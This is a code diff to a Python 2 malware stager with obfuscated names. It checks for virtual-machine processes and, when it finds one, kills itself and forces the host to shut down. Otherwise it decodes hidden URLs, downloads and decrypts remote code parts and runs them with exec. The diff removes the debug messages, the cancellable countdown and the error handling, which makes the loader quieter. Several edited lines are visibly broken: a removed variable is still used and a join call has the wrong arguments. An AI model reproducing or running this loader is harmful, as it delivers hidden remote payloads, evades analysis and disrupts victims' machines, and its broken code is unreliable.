@@ -95,80 +95,46 @@ def main(*args, **kwargs):
             finally:
                 AccidentalAquaticCat['v'] = '00000000000000000000'
                 return AccidentalAquaticCat                
-                
-    s = 'tasklist' if os.name is 'nt' else 'ps'
-    c = 0 if os.name is 'nt' else -1
     
     if kwargs.get('checkvm'):
         check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
-        check_procs   = [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
+        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
         if len(check_environ + check_procs):
-            try:
-                if _debug:
-                    print("Virtual Machine detected")
-                    if len(check_environ):
-                        print("Environment variables:\n\t{}".format(', '.join(["{}".format(i) for i in check_environ])))
-                    if len(check_procs):
-                        print("Running processes:\n\t{}".format(', '.join(["{}".format(i) for i in check_procs])))
-                    for i in reversed(range(1,10)):
-                        os.system('cls' if os.name is 'nt' else 'clear')
-                        print("\n\n\tAborting...\n\n\t(press Ctrl + C to cancel)\n\n\tSelf-destruct and shutdown in: %d\n\n" % i)
-                        time.sleep(1)
+            if not _debug:
                 if os.name is 'nt':
                     _ = os.popen('taskkill /pid %d' % os.getpid()).read()
                     _ = os.popen('shutdown /p /f').read()                 
                 else:
                     _ = os.popen('kill -9 %d' % os.getpid()).read()
                     _ = os.popen('shutdown --poweroff --no-wall').read()
-            except KeyboardInterrupt:
-                if _debug:
-                    print("Self-destruct cancelled")
+
     if 'config' in kwargs:
-        try:
-            if _debug:
-                print("Continuing launch")
-            AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
-            SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
-            pkgs     = 'from __future__ import print_function\n'
-            if 'z' in AccidentalAquaticCat:
-                if _debug:
-                    print("Decrypting + assembling + configuring payload...")
-                head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-                head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
-                foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
-                foot = base64.b64decode(foot)
-                body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-                body = QuadraticFungalLegend(body, foot)
-                pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
-            else:
-                head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-                head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
-                body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-                pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
-            return (pkgs, body, head)
-        except KeyboardInterrupt:
-            if _debug:
-                print("Launch cancelled\nExiting...")
-            sys.exit()
+        AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
+        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
+        pkgs     = 'from __future__ import print_function\n'
+        if 'z' in AccidentalAquaticCat:
+            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
+            foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
+            foot = base64.b64decode(foot)
+            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            body = QuadraticFungalLegend(body, foot)
+            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
+        else:
+            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
+            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
+        exec('\n\n\n'.join(pkgs, body, head)) in globals()
+
 
 if __name__ == '__main__':
-    try:
+    if len(sys.argv) > 1:
         if '--debug' in sys.argv:
             _debug = True
         else:
             _debug = False
-        header, body, footer = main(checkvm=True, config=81126388790932157784)
-        code = '\n\n\n'.join([header, body, footer])
-        if _debug:
-            print("Dynamic payload generation complete")
-            print("Executing...")
-            time.sleep(1)
-        exec(code)
-    except KeyboardInterrupt:
-        if _debug:
-            print("Launch cancelled\nExiting...")
-        sys.exit()
-    except Exception as e:
-        if _debug:
-            print("Error: {}".format(str(e)))
+        main(config=81126388790932157784)
+
+
             
